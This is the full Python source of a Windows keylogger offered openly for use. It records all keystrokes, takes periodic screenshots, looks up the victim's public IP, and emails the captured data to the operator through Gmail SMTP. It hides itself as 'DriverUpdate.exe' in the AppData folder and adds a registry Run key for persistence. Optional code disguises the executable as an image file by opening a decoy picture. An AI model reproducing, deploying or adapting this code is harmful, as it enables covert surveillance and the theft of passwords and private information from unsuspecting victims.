#!usr/bin/env python

# Keylogger created by pj-022

# For this to work you have to enable the 'less secure apps' function on the email you want to use in keylogger
# You can search that in security settings of your gmail account


import os
import shutil
import smtplib
import subprocess
import sys
import threading
import pynput.keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import email.encoders
import urllib
import re
from PIL import ImageGrab

# Created a class for keylogger and contains all the function of it
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        # Will send the message to your mail id "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.TheIp = self.ip_check()
        #self.check_file()   # Use this function only when using pyinstaller for packaging otherwise leave it as is

    # This function is defined to make program persistent
    # It will make a copy of file at a hidden location and will add it to startup programs
    def persistance(self):
        file_loc = os.environ["appdata"] + "\\DriverUpdate.exe"
        if not os.path.exists(file_loc):
            shutil.copyfile(sys.executable, file_loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DriversUpdate /t REG_SZ /d "' + file_loc + '"', shell=True)

    def check_file(self):
        file_loc1 = os.environ["appdata"]
        output = os.getcwd()
        if str(output) != str(file_loc1):
            # This two lines
            file_name = sys._MEIPASS + "/image.jpg"   # this "image.jpg" is the file name used in pyinstaller to create the .exe file.
            # as this file is created into a image file named "image.jpg"
            subprocess.Popen(file_name, shell=True)
        self.persistance()
 
    # This function appends all the keys to make it a whole word/sentence
    def append_to_log(self, string):
        self.log = self.log + string

    # This function records all the keys pressed and store it in a string
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    # This function captures screenshot and stores them as "image.png"
    # and after that using send_email function it sends the picture via mail
    def screenshot(self):
        image = ImageGrab.grab(bbox=(0,0,1500,1000))
        image.save('image.png')
        self.send_image('image.png')
        os.remove("image.png")
        
    # This function creates email of screenshot and send it via send_mail function 
    def send_image(self, attach):

        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Screenshot"

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(attach, 'rb').read())
        email.encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
        msg.attach(part)

        self.send_mail(self.email, self.password, msg.as_string())
        
    # This function adds the IP of device in every email sent
    def ip_check(self):
        url = "http://checkip.dyndns.org"
        request = urllib.urlopen(url).read()
        theIP = re.findall(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", request)
        return str(theIP)

    # This function reports all the keys pressed on the email at a certain time interval using threading timer
    def report(self):

        if self.log == "Keylogger Started":
            self.log = "Message from " + self.TheIp + "\n" +  self.log
            self.send_mail(self.email, self.password, "\n\n" + self.log)

        elif self.log != "":
            self.log = "Message from " + self.TheIp + "\n" +  self.log
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.screenshot()

        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # This function writes and send mails using the server of gmail
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # This function starts the keylogger and starts all of the functions in correct order
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Here we call function and provide all the parameters that are time interval, email, password.
# Add your own email, password and time interval(in seconds) between emails here

my_keylogger = Keylogger('time interval you want(in seconds)', "Your gmail id", "Your password")    # Parameters order :- time, "email", "password"
                          # Time interval(in seconds) is without inverted commas

# starts the keylogger class

my_keylogger.start()
